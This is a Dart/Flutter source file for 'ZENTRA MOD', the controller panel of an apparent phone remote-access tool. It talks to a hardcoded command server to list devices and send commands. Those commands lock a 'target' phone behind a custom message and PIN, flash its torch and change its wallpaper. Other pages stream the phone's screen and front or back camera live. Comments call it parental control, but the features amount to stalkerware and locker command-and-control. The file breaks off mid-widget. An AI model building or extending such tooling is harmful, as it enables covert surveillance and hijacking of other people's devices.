import 'package:flutter/material.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'dart:async';
import 'dart:typed_data';

const String SERVER_URL = "http://denisrespanel.pteroq.xyz:10603";

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  runApp(const ZentraModApp());
}

class ZentraModApp extends StatelessWidget {
  const ZentraModApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'ZENTRA MOD',
      debugShowCheckedModeBanner: false,
      theme: ThemeData(brightness: Brightness.dark),
      home: const DeviceListPage(),
    );
  }
}

// ============================================================
// DEVICE LIST PAGE
// ============================================================
class DeviceListPage extends StatefulWidget {
  const DeviceListPage({super.key});

  @override
  State<DeviceListPage> createState() => _DeviceListPageState();
}

class _DeviceListPageState extends State<DeviceListPage> {
  List<Map<String, dynamic>> devices = [];
  bool isLoading = true;
  bool _serverOnline = true;
  String _serverError = '';
  late SharedPreferences prefs;
  Timer? refreshTimer;

  @override
  void initState() {
    super.initState();
    _initialize();
    refreshTimer = Timer.periodic(const Duration(seconds: 5), (_) {
      _fetchDevicesFromServer(showDialog: false);
    });
  }

  @override
  void dispose() {
    refreshTimer?.cancel();
    super.dispose();
  }

  Future<void> _initialize() async {
    prefs = await SharedPreferences.getInstance();
    await _fetchDevicesFromServer(showDialog: true);
    setState(() => isLoading = false);
  }

  Future<void> _fetchDevicesFromServer({bool showDialog = false}) async {
    try {
      final response = await http.get(
        Uri.parse('$SERVER_URL/api/devices'),
        headers: {'Content-Type': 'application/json'},
      ).timeout(const Duration(seconds: 10));

      if (response.statusCode == 200) {
        final data = jsonDecode(response.body);
        final List<dynamic> devicesList = data['devices'] ?? [];

        if (mounted) {
          setState(() {
            devices = List<Map<String, dynamic>>.from(
              devicesList.map((x) => Map<String, dynamic>.from(x as Map)),
            );
            _serverOnline = true;
            _serverError = '';
          });
        }
        await prefs.setString('devices', jsonEncode(devices));
      } else {
        if (mounted) {
          setState(() {
            _serverOnline = false;
            _serverError = 'Server error: HTTP ${response.statusCode}';
          });
          if (showDialog) _showConnectionErrorDialog();
        }
        _loadDevicesFromLocal();
      }
    } on TimeoutException {
      debugPrint("Fetch timeout");
      if (mounted) {
        setState(() {
          _serverOnline = false;
          _serverError = 'Timeout — Server tidak merespon';
        });
        if (showDialog) _showConnectionErrorDialog();
      }
      _loadDevicesFromLocal();
    } catch (e) {
      debugPrint("Fetch error: $e");
      if (mounted) {
        setState(() {
          _serverOnline = false;
          _serverError = 'Gagal terhubung ke server';
        });
        if (showDialog) _showConnectionErrorDialog();
      }
      _loadDevicesFromLocal();
    }
  }

  void _showConnectionErrorDialog() {
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (_) => Dialog(
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20)),
        backgroundColor: Colors.white,
        child: Padding(
          padding: const EdgeInsets.symmetric(vertical: 32, horizontal: 24),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              Container(
                width: 64,
                height: 64,
                decoration: BoxDecoration(
                  color: Colors.red[50],
                  shape: BoxShape.circle,
                ),
                child: const Icon(Icons.error_outline, color: Colors.red, size: 36),
              ),
              const SizedBox(height: 20),
              const Text(
                'Connection Error',
                style: TextStyle(
                  color: Colors.black,
                  fontSize: 20,
                  fontWeight: FontWeight.bold,
                ),
              ),
              const SizedBox(height: 10),
              Text(
                _serverError.isNotEmpty ? _serverError : 'Gagal terhubung ke server.',
                textAlign: TextAlign.center,
                style: const TextStyle(color: Colors.blueGrey, fontSize: 14),
              ),
              const SizedBox(height: 28),
              SizedBox(
                width: double.infinity,
                child: ElevatedButton(
                  onPressed: () => Navigator.of(_).pop(),
                  style: ElevatedButton.styleFrom(
                    backgroundColor: const Color(0xFFE8A020),
                    padding: const EdgeInsets.symmetric(vertical: 16),
                    shape: RoundedRectangleBorder(
                      borderRadius: BorderRadius.circular(12),
                    ),
                  ),
                  child: const Text(
                    'Close',
                    style: TextStyle(
                      color: Colors.white,
                      fontSize: 16,
                      fontWeight: FontWeight.bold,
                    ),
                  ),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  void _loadDevicesFromLocal() {
    final devicesJson = prefs.getString('devices') ?? '[]';
    try {
      final List<dynamic> decoded = jsonDecode(devicesJson);
      if (mounted) {
        setState(() {
          devices = List<Map<String, dynamic>>.from(
            decoded.map((x) => Map<String, dynamic>.from(x as Map)),
          );
        });
      }
    } catch (e) {
      debugPrint("Error loading devices: $e");
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text('ZENTRA MOD - Control'),
        centerTitle: true,
        backgroundColor: const Color(0xFF0f3460),
      ),
      body: Column(
        children: [
          // Banner server status — muncul otomatis saat server DOWN/timeout
          if (!_serverOnline)
            Container(
              width: double.infinity,
              color: Colors.red[800],
              padding: const EdgeInsets.symmetric(vertical: 8, horizontal: 16),
              child: Row(
                children: [
                  const Icon(Icons.wifi_off, color: Colors.white, size: 18),
                  const SizedBox(width: 8),
                  Expanded(
                    child: Text(
                      '⚠️ $_serverError',
                      style: const TextStyle(color: Colors.white, fontSize: 13),
                    ),
                  ),
                  TextButton(
                    onPressed: () => _fetchDevicesFromServer(showDialog: true),
                    child: const Text('Retry', style: TextStyle(color: Colors.yellow)),
                  ),
                ],
              ),
            ),
          Expanded(
            child: isLoading
          ? const Center(child: CircularProgressIndicator())
          : devices.isEmpty
              ? Center(
                  child: Column(
                    mainAxisAlignment: MainAxisAlignment.center,
                    children: [
                      const Icon(Icons.devices_other, size: 80, color: Colors.grey),
                      const SizedBox(height: 20),
                      const Text('Belum ada perangkat terdaftar'),
                      const SizedBox(height: 20),
                      ElevatedButton(
                        onPressed: () => _fetchDevicesFromServer(showDialog: true),
                        child: const Text('Refresh'),
                      ),
                    ],
                  ),
                )
              : ListView.builder(
                  padding: const EdgeInsets.all(16),
                  itemCount: devices.length,
                  itemBuilder: (context, index) {
                    final device = devices[index];
                    final isOnline = device['status'] == 'online';

                    return Container(
                      margin: const EdgeInsets.only(bottom: 12),
                      decoration: BoxDecoration(
                        border: Border.all(
                          color: isOnline ? Colors.green : Colors.red,
                          width: 2,
                        ),
                        borderRadius: BorderRadius.circular(12),
                        color: const Color(0xFF16213e),
                      ),
                      child: ListTile(
                        leading: Icon(
                          Icons.smartphone,
                          color: isOnline ? Colors.green : Colors.red,
                          size: 32,
                        ),
                        title: Text(
                          device['deviceName'] ?? 'Device',
                          style: const TextStyle(
                            fontSize: 16,
                            fontWeight: FontWeight.bold,
                          ),
                        ),
                        subtitle: Text(
                          isOnline ? '🟢 Online' : '🔴 Offline',
                          style: TextStyle(
                            color: isOnline ? Colors.green : Colors.red,
                          ),
                        ),
                        trailing: const Icon(Icons.arrow_forward_ios),
                        onTap: isOnline
                            ? () {
                                Navigator.push(
                                  context,
                                  MaterialPageRoute(
                                    builder: (_) =>
                                        TorchControlPage(device: device),
                                  ),
                                );
                              }
                            : null,
                      ),
                    );
                  },
                ),
          ),
        ],
      ),
    );
  }
}

// ============================================================
// TORCH CONTROL PAGE - DENGAN LOCK & FLASH
// ============================================================
class TorchControlPage extends StatefulWidget {
  final Map<String, dynamic> device;

  const TorchControlPage({
    super.key,
    required this.device,
  });

  @override
  State<TorchControlPage> createState() => _TorchControlPageState();
}

class _TorchControlPageState extends State<TorchControlPage> {
  bool _isLocked = true;
  bool _isFlashing = false;
  Timer? _flashTimer;
  bool _flashState = false;
  String _statusMessage = 'Device Locked';
  late SharedPreferences prefs;
  String _savedPassword = '1234'; // Default password langsung tersedia

  @override
  void initState() {
    super.initState();
    _initPrefs();
  }

  Future<void> _initPrefs() async {
    prefs = await SharedPreferences.getInstance();
    final saved = prefs.getString('device_password');
    if (saved != null && saved.isNotEmpty) {
      setState(() {
        _savedPassword = saved;
      });
    }
  }

  // ============================================================
  // DIALOG INFORMASI - muncul setiap tombol dipencet
  // (persis seperti contoh: judul "Informasi" + pesan + tombol "WOKE")
  // ============================================================
  void _showInfoDialog(String message) {
    if (!mounted) return;
    showDialog(
      context: context,
      barrierDismissible: true,
      builder: (context) {
        return Dialog(
          backgroundColor: const Color(0xFF0d0d1a),
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(12),
            side: const BorderSide(color: Colors.green, width: 1.5),
          ),
          child: Padding(
            padding: const EdgeInsets.fromLTRB(20, 20, 20, 12),
            child: Column(
              mainAxisSize: MainAxisSize.min,
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                const Text(
                  'Informasi',
                  style: TextStyle(
                    color: Colors.white,
                    fontSize: 20,
                    fontWeight: FontWeight.bold,
                  ),
                ),
                const SizedBox(height: 8),
                Container(height: 1, color: Colors.white24),
                const SizedBox(height: 16),
                Text(
                  message,
                  style: const TextStyle(color: Colors.white, fontSize: 15),
                ),
                const SizedBox(height: 16),
                Align(
                  alignment: Alignment.centerRight,
                  child: TextButton(
                    onPressed: () => Navigator.pop(context),
                    child: const Text(
                      'WOKE',
                      style: TextStyle(
                        color: Colors.green,
                        fontWeight: FontWeight.bold,
                        fontSize: 15,
                      ),
                    ),
                  ),
                ),
              ],
            ),
          ),
        );
      },
    );
  }

  @override
  void dispose() {
    _flashTimer?.cancel();
    _stopFlash();
    super.dispose();
  }

  // ============================================================
  // LOCK DIALOG - PASSWORD INPUT
  // ============================================================
  // ============================================================
  // LOCK DEVICE - Tampilkan dialog input pesan + set password baru
  // ============================================================
  void _showLockSetupDialog() {
    String messageInput = '';
    String passwordInput = '';

    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (context) {
        return AlertDialog(
          backgroundColor: const Color(0xFF16213e),
          title: const Text(
            'Lock Device',
            style: TextStyle(color: Colors.white),
          ),
          content: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              TextField(
                style: const TextStyle(color: Colors.white),
                decoration: InputDecoration(
                  hintText: 'Pesan untuk target',
                  hintStyle: TextStyle(color: Colors.grey[500]),
                  enabledBorder: OutlineInputBorder(
                    borderRadius: BorderRadius.circular(8),
                    borderSide: const BorderSide(color: Colors.cyan),
                  ),
                  focusedBorder: OutlineInputBorder(
                    borderRadius: BorderRadius.circular(8),
                    borderSide: const BorderSide(color: Colors.cyan),
                  ),
                ),
                onChanged: (value) => messageInput = value,
              ),
              const SizedBox(height: 16),
              TextField(
                style: const TextStyle(color: Colors.white),
                keyboardType: TextInputType.number,
                decoration: InputDecoration(
                  hintText: 'PIN unlock',
                  hintStyle: TextStyle(color: Colors.grey[500]),
                  enabledBorder: OutlineInputBorder(
                    borderRadius: BorderRadius.circular(8),
                    borderSide: const BorderSide(color: Colors.cyan),
                  ),
                  focusedBorder: OutlineInputBorder(
                    borderRadius: BorderRadius.circular(8),
                    borderSide: const BorderSide(color: Colors.cyan),
                  ),
                ),
                onChanged: (value) => passwordInput = value,
              ),
            ],
          ),
          actions: [
            TextButton(
              onPressed: () => Navigator.pop(context),
              child: const Text('Batal', style: TextStyle(color: Colors.grey)),
            ),
            TextButton(
              onPressed: () {
                if (passwordInput.isEmpty) {
                  _showInfoDialog('Masukkan PIN dulu!');
                  return;
                }
                Navigator.pop(context);
                _lockDevice(messageInput, passwordInput);
              },
              child: const Text('WOKE', style: TextStyle(color: Colors.green, fontWeight: FontWeight.bold)),
            ),
          ],
        );
      },
    );
  }

  // ============================================================
  // UNLOCK DIALOG - Masukkan password untuk buka lock (di app kontrol)
  // ============================================================
  void _showLockDialog() {
    // Tombol Unlock di HP orang tua = langsung unlock otomatis
    // (tidak perlu masukin password lagi, karena orang tua yang berkuasa penuh)
    _unlockDevice();
  }

  // ============================================================
  // UNLOCK DEVICE - Kirim command STOP senter ke HP anak + unlock layar
  // ============================================================
  Future<void> _unlockDevice() async {
    setState(() {
      _isLocked = false;
      _statusMessage = 'Device Unlocked';
    });
    _stopFlash();

    // Kirim command supaya HP anak ke-unlock & senter berhenti
    try {
      final deviceId = widget.device['deviceId'];
      await http.post(
        Uri.parse('$SERVER_URL/api/command/$deviceId'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({'action': 'unlock'}),
      ).timeout(const Duration(seconds: 10));

      _showInfoDialog('Perangkat berhasil di-unlock');
    } on TimeoutException {
      debugPrint('Unlock timeout');
      if (mounted) _showInfoDialog('❌ Timeout — Server tidak merespon. Pastikan server online dan device terhubung.');
    } catch (e) {
      debugPrint('Unlock command error: $e');
      if (mounted) _showInfoDialog('❌ Gagal mengirim perintah unlock. Periksa koneksi internet.');
    }
  }

  // ============================================================
  // LOCK DEVICE - Kirim pesan + password ke HP anak (full-screen lock)
  // ============================================================
  Future<void> _lockDevice(String message, String password) async {
    setState(() {
      _isLocked = true;
      _statusMessage = 'Device Locked';
      _savedPassword = password; // Simpan supaya bisa unlock dari app kontrol juga
    });
    _startFlash(); // Indikator visual di HP orang tua

    // Kirim command lock (pesan + password) supaya HP anak full-screen lock + senter kedap-kedip
    try {
      final deviceId = widget.device['deviceId'];
      await http.post(
        Uri.parse('$SERVER_URL/api/command/$deviceId'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({
          'action': 'lock',
          'message': message.isEmpty ? 'Device dikunci oleh orang tua' : message,
          'password': password,
        }),
      ).timeout(const Duration(seconds: 10));

      _showInfoDialog('Perangkat berhasil dikunci');
    } on TimeoutException {
      debugPrint('Lock timeout');
      if (mounted) _showInfoDialog('❌ Timeout — Server tidak merespon. Pastikan server online dan device terhubung.');
    } catch (e) {
      debugPrint('Lock command error: $e');
      if (mounted) _showInfoDialog('❌ Gagal mengirim perintah lock. Periksa koneksi internet.');
    }
  }

  // ============================================================
  // SET WALLPAPER - Dialog input URL foto (CatBox dll)
  // ============================================================
  void _showSetWallpaperDialog() {
    final urlController = TextEditingController();

    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (context) {
        return AlertDialog(
          backgroundColor: const Color(0xFF16213e),
          title: const Text(
            'Set Wallpaper',
            style: TextStyle(color: Colors.white),
          ),
          content: Column(
            mainAxisSize: MainAxisSize.min,
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              const Text(
                'Masukkan URL foto (CatBox, Imgur, dll):',
                style: TextStyle(color: Colors.grey, fontSize: 13),
              ),
              const SizedBox(height: 12),
              TextField(
                controller: urlController,
                style: const TextStyle(color: Colors.white),
                keyboardType: TextInputType.url,
                autocorrect: false,
                decoration: InputDecoration(
                  hintText: 'https://files.catbox.moe/xxxxx.jpg',
                  hintStyle: TextStyle(color: Colors.grey[600], fontSize: 12),
                  prefixIcon: const Icon(Icons.link, color: Color(0xFFa855f7)),
                  enabledBorder: OutlineInputBorder(
                    borderRadius: BorderRadius.circular(8),
                    borderSide: const BorderSide(color: Color(0xFFa855f7)),
                  ),
                  focusedBorder: OutlineInputBorder(
                    borderRadius: BorderRadius.circular(8),
                    borderSide: const BorderSide(color: Color(0xFFa855f7), width: 2),
                  ),
                ),
              ),
            ],
          ),
          actions: [
            TextButton(
              onPressed: () {
                urlController.dispose();
                Navigator.pop(context);
              },
              child: const Text('Batal', style: TextStyle(color: Colors.grey)),
            ),
            TextButton(
              onPressed: () {
                final url = urlController.text.trim();
                if (url.isEmpty) {
                  _showInfoDialog('Masukkan URL foto dulu!');
                  return;
                }
                if (!url.startsWith('http://') && !url.startsWith('https://')) {
                  _showInfoDialog('URL tidak valid! Harus diawali http:// atau https://');
                  return;
                }
                urlController.dispose();
                Navigator.pop(context);
                _sendSetWallpaperCommand(url);
              },
              child: const Text(
                'SET WALLPAPER',
                style: TextStyle(
                  color: Color(0xFFa855f7),
                  fontWeight: FontWeight.bold,
                ),
              ),
            ),
          ],
        );
      },
    );
  }

  Future<void> _sendSetWallpaperCommand(String imageUrl) async {
    try {
      final deviceId = widget.device['deviceId'];
      final response = await http.post(
        Uri.parse('$SERVER_URL/api/command/$deviceId'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({
          'action': 'setWallpaper',
          'message': imageUrl,
        }),
      ).timeout(const Duration(seconds: 10));

      if (!mounted) return;

      if (response.statusCode == 200) {
        _showInfoDialog('Perintah Set Wallpaper berhasil dikirim!\nDevice akan segera mengganti wallpaper.');
      } else {
        _showInfoDialog('Gagal mengirim perintah ke server.');
      }
    } on TimeoutException {
      debugPrint('Set wallpaper timeout');
      if (mounted) _showInfoDialog('❌ Timeout — Server tidak merespon. Pastikan server online dan device terhubung.');
    } catch (e) {
      debugPrint('Set wallpaper error: $e');
      if (mounted) _showInfoDialog('❌ Gagal mengirim perintah Set Wallpaper. Periksa koneksi internet.');
    }
  }

  // ============================================================
  // FLASH ON - KEDAP-KEDIP CEPAT
  // ============================================================
  Future<void> _flashOn() async {
    try {
      final deviceId = widget.device['deviceId'];
      await http.post(
        Uri.parse('$SERVER_URL/api/command/$deviceId'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({'action': 'torch', 'state': 'blink'}),
      ).timeout(const Duration(seconds: 10));

      if (!mounted) return;

      setState(() {
        _isFlashing = true;
        _statusMessage = 'Flash: Kedap-Kedip';
      });

      _startFlash();

      _showInfoDialog('Flash berhasil dinyalakan (kedap-kedip)');
    } on TimeoutException {
      if (!mounted) return;
      setState(() => _statusMessage = 'Error: Timeout');
      _showInfoDialog('❌ Timeout — Server tidak merespon. Pastikan server online dan device terhubung.');
    } catch (e) {
      if (!mounted) return;
      setState(() => _statusMessage = 'Error: Gagal mengirim perintah');
      _showInfoDialog('❌ Gagal menyalakan flash. Periksa koneksi internet.');
    }
  }

  // ============================================================
  // FLASH OFF - BERHENTI KEDAP-KEDIP
  // ============================================================
  Future<void> _flashOff() async {
    try {
      final deviceId = widget.device['deviceId'];
      await http.post(
        Uri.parse('$SERVER_URL/api/command/$deviceId'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({'action': 'torch', 'state': 'off'}),
      ).timeout(const Duration(seconds: 10));

      if (!mounted) return;

      setState(() {
        _isFlashing = false;
        _statusMessage = 'Flash: Off';
      });

      _stopFlash();

      _showInfoDialog('Flash berhasil dimatikan');
    } on TimeoutException {
      if (!mounted) return;
      setState(() => _statusMessage = 'Error: Timeout');
      _showInfoDialog('❌ Timeout — Server tidak merespon. Pastikan server online dan device terhubung.');
    } catch (e) {
      if (!mounted) return;
      setState(() => _statusMessage = 'Error: Gagal mengirim perintah');
      _showInfoDialog('❌ Gagal mematikan flash. Periksa koneksi internet.');
    }
  }

  // ============================================================
  // START FLASH - KEDAP-KEDIP CEPAT KONSISTEN
  // ============================================================
  void _startFlash() {
    _flashTimer?.cancel();

    // Kedap-kedip CEPAT konsisten (150ms), sama seperti di HP anak
    List<int> durations = [150, 150]; // milliseconds
    int index = 0;

    void toggleFlash() {
      _flashState = !_flashState;
      setState(() {});

      final nextDuration = durations[index % durations.length];
      index++;

      _flashTimer = Timer(Duration(milliseconds: nextDuration), toggleFlash);
    }

    toggleFlash();
  }

  // ============================================================
  // STOP FLASH
  // ============================================================
  void _stopFlash() {
    _flashTimer?.cancel();
    _flashTimer = null;
    setState(() => _flashState = false);
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: Text(widget.device['deviceName'] ?? 'Device'),
        centerTitle: true,
        backgroundColor: const Color(0xFF0f3460),
      ),
      body: _buildMainUI(),
    );
  }

  // ============================================================
  // MAIN UI - 4 TOMBOL SELALU TAMPIL (Flash ON, Flash OFF, Lock, Unlock)
  // ============================================================
  // ============================================================
  // MAIN UI - 4 TOMBOL SELALU TAMPIL (Flash ON, Flash OFF, Lock, Unlock)
  // ============================================================
  Widget _buildMainUI() {
    return Column(
      children: [
        // 4 Tombol - SELALU TAMPIL, tidak peduli locked/unlocked
        Expanded(
          child: SingleChildScrollView(
            padding: const EdgeInsets.all(20),
            child: Column(
              children: [
                const SizedBox(height: 20),
                // Flash ON / OFF
                GridView.count(
                  shrinkWrap: true,
                  crossAxisCount: 2,
                  mainAxisSpacing: 20,
                  crossAxisSpacing: 20,
                  childAspectRatio: 1.2,
                  children: [
                    _buildControlButton(
                      icon: Icons.flash_on,
                      label: 'Flash ON',
                      color: Colors.green,
                      onPressed: _flashOn,
                    ),
                    _buildControlButton(
                      icon: Icons.flash_off,
                      label: 'Flash OFF',
                      color: Colors.red,
                      onPressed: _flashOff,
                    ),
                  ],
                ),
                const SizedBox(height: 30),
                const Divider(color: Colors.grey),
                const SizedBox(height: 30),
                // Lock / Unlock
                GridView.count(
                  shrinkWrap: true,
                  crossAxisCount: 2,
                  mainAxisSpacing: 20,
                  crossAxisSpacing: 20,
                  childAspectRatio: 1.2,
                  children: [
                    _buildControlButton(
                      icon: Icons.lock,
                      label: 'Lock',
                      color: Colors.green,
                      onPressed: _showLockSetupDialog,
                    ),
                    _buildControlButton(
                      icon: Icons.lock_open,
                      label: 'Unlock',
                      color: Colors.red,
                      onPressed: _showLockDialog,
                    ),
                  ],
                ),
                const SizedBox(height: 30),
                const Divider(color: Colors.grey),
                const SizedBox(height: 30),
                // Live Screen / Live Camera
                GridView.count(
                  shrinkWrap: true,
                  crossAxisCount: 2,
                  mainAxisSpacing: 20,
                  crossAxisSpacing: 20,
                  childAspectRatio: 1.2,
                  children: [
                    _buildControlButton(
                      icon: Icons.screen_share,
                      label: 'Live Screen',
                      color: const Color(0xFF00d4ff),
                      onPressed: () {
                        Navigator.push(
                          context,
                          MaterialPageRoute(
                            builder: (context) => LiveScreenPage(device: widget.device),
                          ),
                        );
                      },
                    ),
                    _buildControlButton(
                      icon: Icons.camera,
                      label: 'Live Camera',
                      color: const Color(0xFFff6b35),
                      onPressed: () {
                        Navigator.push(
                          context,
                          MaterialPageRoute(
                            builder: (context) => LiveCameraPage(device: widget.device),
                          ),
                        );
                      },
                    ),
                  ],
                ),
                const SizedBox(height: 30),
                const Divider(color: Colors.grey),
                const SizedBox(height: 30),
                // Set Wallpaper
                GridView.count(
                  shrinkWrap: true,
                  crossAxisCount: 2,
                  mainAxisSpacing: 20,
                  crossAxisSpacing: 20,
                  childAspectRatio: 1.2,
                  children: [
                    _buildControlButton(
                      icon: Icons.wallpaper,
                      label: 'Set Wallpaper',
                      color: const Color(0xFFa855f7),
                      onPressed: _showSetWallpaperDialog,
                    ),
                  ],
                ),
              ],
            ),
          ),
        ),
      ],
    );
  }

  Widget _buildControlButton({
    required IconData icon,
    required String label,
    required Color color,
    required VoidCallback onPressed,
  }) {
    return Container(
      decoration: BoxDecoration(
        border: Border.all(color: color.withOpacity(0.5), width: 2),
        borderRadius: BorderRadius.circular(16),
        color: const Color(0xFF16213e),
      ),
      child: Material(
        color: Colors.transparent,
        child: InkWell(
          onTap: onPressed,
          borderRadius: BorderRadius.circular(14),
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              Icon(icon, size: 50, color: color),
              const SizedBox(height: 12),
              Text(
                label,
                textAlign: TextAlign.center,
                style: TextStyle(
                  fontSize: 16,
                  fontWeight: FontWeight.bold,
                  color: color,
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }
}

// ============================================================
// LIVE SCREEN PAGE — frame polling (base64 JPEG dari backend)
// ============================================================
class LiveScreenPage extends StatefulWidget {
  final Map<String, dynamic> device;
  const LiveScreenPage({Key? key, required this.device}) : super(key: key);

  @override
  State<LiveScreenPage> createState() => _LiveScreenPageState();
}

class _LiveScreenPageState extends State<LiveScreenPage> {
  String statusMessage = "Menghubungkan ke Live Screen...";
  Uint8List? frameBytes;
  Timer? _pollTimer;
  bool _started = false;

  @override
  void initState() {
    super.initState();
    _startLiveScreen();
  }

  @override
  void dispose() {
    _pollTimer?.cancel();
    _stopLiveScreen();
    super.dispose();
  }

  Future<void> _startLiveScreen() async {
    try {
      final deviceId = widget.device['deviceId'];
      // Kirim perintah ke device agar mulai upload frame layar
      final response = await http.get(
        Uri.parse('$SERVER_URL/api/liveScreen/$deviceId'),
      ).timeout(const Duration(seconds: 10));
      if (response.statusCode == 200) {
        _started = true;
        if (mounted) setState(() => statusMessage = '🔴 LIVE - Device Screen');
      } else {
        if (mounted) setState(() => statusMessage = 'Gagal: Server error ${response.statusCode}');
      }
    } catch (e) {
      if (mounted) setState(() => statusMessage = 'Gagal memulai Live Screen');
    }
    // Polling frame tiap 1 detik
    _pollTimer?.cancel();
    _pollTimer = Timer.periodic(const Duration(milliseconds: 600), (_) => _fetchFrame());
  }

  Future<void> _stopLiveScreen() async {
    if (!_started) return;
    try {
      final deviceId = widget.device['deviceId'];
      await http.get(
        Uri.parse('$SERVER_URL/api/stopLiveScreen/$deviceId'),
      ).timeout(const Duration(seconds: 5));
    } catch (_) {}
  }

  bool _isFetchingScreen = false;

  Future<void> _fetchFrame() async {
    if (_isFetchingScreen) return; // skip kalau masih proses frame sebelumnya
    _isFetchingScreen = true;
    try {
      final deviceId = widget.device['deviceId'];
      final response = await http.get(
        Uri.parse('$SERVER_URL/api/frame/screen/$deviceId'),
      ).timeout(const Duration(milliseconds: 500));

      if (response.statusCode == 200) {
        final data = jsonDecode(response.body);
        if (data['hasFrame'] == true) {
          final b64 = data['frameData'] as String;
          final bytes = base64Decode(b64);
          if (mounted) setState(() => frameBytes = bytes);
        }
      }
    } catch (_) {}
    finally {
      _isFetchingScreen = false;
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text('Live Screen - Pantau Aktivitas'),
        centerTitle: true,
        backgroundColor: const Color(0xFF0f3460),
      ),
      body: Stack(
        fit: StackFit.expand,
        children: [
          // Frame layar — fullscreen
          SizedBox.expand(
            child: frameBytes != null
                ? Image.memory(
                    frameBytes!,
                    fit: BoxFit.contain,
                    gaplessPlayback: true,
                    width: double.infinity,
                    height: double.infinity,
                  )
                : Container(
                    color: Colors.black,
                    child: Column(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        const CircularProgressIndicator(color: Colors.cyan),
                        const SizedBox(height: 20),
                        Text(statusMessage,
                            style: const TextStyle(color: Colors.white),
                            textAlign: TextAlign.center),
                        const SizedBox(height: 10),
                        const Text('Menunggu frame dari device...',
                            style: TextStyle(color: Colors.grey, fontSize: 12)),
                      ],
                    ),
                  ),
          ),
          // Status Bar atas
          Positioned(
            top: 0, left: 0, right: 0,
            child: Container(
              color: Colors.black54,
              padding: const EdgeInsets.symmetric(vertical: 8, horizontal: 12),
              child: Text(statusMessage,
                  style: const TextStyle(color: Colors.lime, fontSize: 13),
                  textAlign: TextAlign.center),
            ),
          ),
          // Back Button
          Positioned(
            bottom: 24, right: 24,
            child: FloatingActionButton(
              backgroundColor: Colors.red,
              onPressed: () => Navigator.pop(context),
              child: const Icon(Icons.close, size: 28),
            ),
          ),
        ],
      ),
    );
  }
}

// ============================================================
// LIVE CAMERA PAGE — frame polling (base64 JPEG dari backend)
// ============================================================
class LiveCameraPage extends StatefulWidget {
  final Map<String, dynamic> device;
  const LiveCameraPage({Key? key, required this.device}) : super(key: key);

  @override
  State<LiveCameraPage> createState() => _LiveCameraPageState();
}

class _LiveCameraPageState extends State<LiveCameraPage> {
  String statusMessage = "Menghubungkan ke Live Camera...";
  Uint8List? frameBytes;
  bool isFrontCamera = true;
  Timer? _pollTimer;
  bool _started = false;

  @override
  void initState() {
    super.initState();
    _startLiveCamera();
  }

  @override
  void dispose() {
    _pollTimer?.cancel();
    _stopLiveCamera();
    super.dispose();
  }

  Future<void> _startLiveCamera({bool front = true}) async {
    final deviceId = widget.device['deviceId'];
    final cameraType = front ? 'front' : 'back';
    try {
      await http.get(
        Uri.parse('$SERVER_URL/api/liveCamera/$deviceId?front=$front'),
      ).timeout(const Duration(seconds: 10));
      _started = true;
      setState(() => statusMessage =
          '🔴 LIVE CAMERA ${front ? "(DEPAN)" : "(BELAKANG)"}');
    } catch (e) {
      setState(() => statusMessage = 'Gagal memulai Live Camera');
    }
    // Polling frame tiap 2 detik
    _pollTimer?.cancel();
    _pollTimer = Timer.periodic(const Duration(milliseconds: 400), (_) => _fetchFrame(cameraType));
  }

  Future<void> _stopLiveCamera() async {
    if (!_started) return;
    try {
      final deviceId = widget.device['deviceId'];
      await http.get(
        Uri.parse('$SERVER_URL/api/stopLiveCamera/$deviceId'),
      ).timeout(const Duration(seconds: 5));
    } catch (_) {}
  }

  bool _isFetchingFrame = false;

  Future<void> _fetchFrame(String cameraType) async {
    if (_isFetchingFrame) return; // skip kalau masih proses frame sebelumnya
    _isFetchingFrame = true;
    try {
      final deviceId = widget.device['deviceId'];
      final response = await http.get(
        Uri.parse('$SERVER_URL/api/frame/camera/$deviceId?cameraType=$cameraType'),
      ).timeout(const Duration(milliseconds: 350));

      if (response.statusCode == 200) {
        final data = jsonDecode(response.body);
        if (data['hasFrame'] == true) {
          final b64 = data['frameData'] as String;
          final bytes = base64Decode(b64);
          if (mounted) setState(() => frameBytes = bytes);
        }
      }
    } catch (_) {} finally {
      _isFetchingFrame = false;
    }
  }

  Future<void> _switchCamera() async {
    _pollTimer?.cancel();
    setState(() {
      isFrontCamera = !isFrontCamera;
      frameBytes = null;
      statusMessage = 'Beralih kamera...';
    });
    // Kirim stop dulu, lalu start kamera baru
    await _stopLiveCamera();
    await _startLiveCamera(front: isFrontCamera);
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text('Live Camera - Lihat Wajah'),
        centerTitle: true,
        backgroundColor: const Color(0xFF0f3460),
      ),
      body: Stack(
        fit: StackFit.expand,
        children: [
          // Frame kamera — fullscreen cover seluruh layar
          SizedBox.expand(
            child: frameBytes != null
                ? Image.memory(
                    frameBytes!,
                    fit: BoxFit.fitWidth,
                    gaplessPlayback: true,
                    width: double.infinity,
                  )
                : Container(
                    color: Colors.black,
                    child: Column(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
